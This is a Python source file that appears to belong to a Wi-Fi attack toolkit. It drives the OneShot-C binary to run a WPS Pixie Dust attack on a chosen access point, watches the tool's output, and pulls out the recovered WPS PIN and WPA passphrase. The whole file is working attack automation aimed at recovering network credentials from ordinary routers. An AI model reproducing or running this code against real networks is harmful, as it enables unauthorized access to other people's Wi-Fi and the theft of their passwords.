# -*- coding: utf-8 -*-
"""OneShot-C pixie fallback (managed mode, no monitor).

OneShot-C is the C rewrite of the old drygdryg/kimocoder OneShot: Pixie Dust +
static/vendor PIN prediction via wpa_supplicant + pixiewps. We drive the
compiled binary directly (tools/oneshot/oneshot). Online 10M PIN brute-force is
never used — only the single-shot -K pixie attempt.
"""
import os
import re
import select
import subprocess
import time

import config
from attack import tools
from attack.model import AttackEvent, EventType

ONESHOT_DIR = os.path.join(config.PROJECT_DIR, "tools", "oneshot")
ONESHOT_BIN = os.path.join(ONESHOT_DIR, "oneshot")
ONESHOT_VULN = os.path.join(ONESHOT_DIR, "vulnwsc.txt")
ONESHOT_MAX_SEC = 25

# OneShot-C's only success output is credential_print():
#   [+] WPS PIN: 45062193
#   [+] WPA PSK: hunter22
# Anchor on those exact markers. The loose "PSK"/"PIN" substrings above were
# matching wpa_supplicant debug lines ("Prefer PSK format key", "PSK1 hexdump",
# "Trying pin 12345670") and recording garbage ("format", "1", bogus pins).
_PIN_RE = re.compile(r"\[\+\]\s*WPS PIN\s*:\s*'?(\d{4,8})", re.I)
_PSK_RE = re.compile(r"\[\+\]\s*WPA PSK\s*:\s*'?(.+?)'?\s*$", re.I)


def available():
    return (os.path.isfile(ONESHOT_BIN)
            and os.access(ONESHOT_BIN, os.X_OK)
            and bool(tools.which("pixiewps", "/usr/bin/pixiewps"))
            and bool(tools.which("wpa_supplicant", "/sbin/wpa_supplicant",
                                 "/usr/sbin/wpa_supplicant")))


def _parse_creds(text):
    pin = psk = None
    for line in (text or "").splitlines():
        m = _PIN_RE.search(line)
        if m:
            pin = m.group(1)
        m = _PSK_RE.search(line)
        if m:
            psk = m.group(1).strip("'\"")
    return pin, psk


def run_pixie(iface, target, emit, stop_flag, timeout=60):
    """Managed-mode OneShot-C -K. Returns {ok, pin, psk, reason, t}."""
    bssid = target.get("bssid")
    essid = target.get("essid") or bssid
    if not available():
        return {"ok": False, "reason": "missing", "t": 0.0}
    if not iface or not bssid:
        return {"ok": False, "reason": "no iface", "t": 0.0}

    cmd = [ONESHOT_BIN, "-i", iface, "-b", bssid, "-K", "-v",
           "--vuln-list", ONESHOT_VULN]
    tools.log("oneshot spawn: %s" % " ".join(cmd))
    emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
                     phase="OSHOT", countdown=timeout, cd_max=timeout))
    start = time.time()
    try:
        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1)
    except Exception as e:  # noqa: BLE001
        return {"ok": False, "reason": str(e)[:20], "t": 0.0}

    buf = []
    pin = psk = None
    reason = "timeout"
    fd = proc.stdout.fileno()
    try:
        while (time.time() - start) < timeout:
            if stop_flag and stop_flag.is_set():
                reason = "cancelled"
                break
            left = max(0, int(timeout - (time.time() - start)))
            ready, _, _ = select.select([fd], [], [], 0.5)
            if not ready:
                emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
                                 phase="OSHOT", countdown=left, cd_max=timeout))
                if proc.poll() is not None:
                    break
                continue
            line = proc.stdout.readline()
            if not line:
                if proc.poll() is not None:
                    break
                continue
            line = line.rstrip()
            if line:
                tools.log("oneshot: %s" % line[:200])
                buf.append(line)
            p, k = _parse_creds(line)
            if p is not None:
                pin = p
            if k is not None:
                psk = k
                reason = "ok"
                break
            if re.search(r"No suitable network found|Unable to connect|"
                         r"Network not found", line, re.I):
                reason = "no ap"
                break
            if re.search(r"WPS pin not found|Pixie.?Dust.*fail|"
                         r"offline attack failed", line, re.I):
                reason = "pixie fail"
                break
        else:
            reason = "timeout"
    finally:
        try:
            proc.terminate()
            proc.wait(timeout=3)
        except Exception:  # noqa: BLE001
            try:
                proc.kill()
            except Exception:  # noqa: BLE001
                pass

    rest = ""
    try:
        if proc.stdout:
            rest = proc.stdout.read() or ""
    except Exception:  # noqa: BLE001
        pass
    if rest:
        p, k = _parse_creds(rest)
        if p is not None:
            pin = p
        if k is not None:
            psk = k
    t = time.time() - start
    if psk is not None:
        return {"ok": True, "psk": psk, "pin": pin, "reason": "ok", "t": t}
    if pin is not None:
        return {"ok": True, "pin": pin, "psk": None, "reason": "ok", "t": t}
    return {"ok": False, "reason": reason, "t": t, "pin": pin, "psk": None}
